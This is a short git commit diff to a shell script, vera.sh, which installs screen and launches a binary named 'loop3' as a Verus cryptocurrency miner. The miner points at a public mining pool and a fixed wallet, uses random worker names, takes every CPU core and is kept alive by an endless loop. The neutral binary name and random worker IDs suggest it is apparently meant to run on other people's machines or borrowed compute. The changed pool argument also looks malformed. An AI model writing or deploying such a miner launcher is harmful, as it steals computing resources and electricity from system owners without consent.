e4a1333f755684f63a11a5d7266e89b0a77fcbbb
cihuuy <95659029+cihuuy@users.noreply.github.com>
2021-12-24 16:42:54 +0530

    Update vera.sh

--- vera.sh
+++ vera.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-./loop3 -v -l verushash.asia.mine.zergpool.com:3300 -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.$(shuf -n 1 -i 1-99999)-cpu -p x -t $(nproc)
+./loop3 -v -l pool1 ap.luckpool.net:3956 -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.$(shuf -n 1 -i 1-99999)-cpu -p x -t $(nproc)
 while [ 1 ]; do
 sleep 3
 done
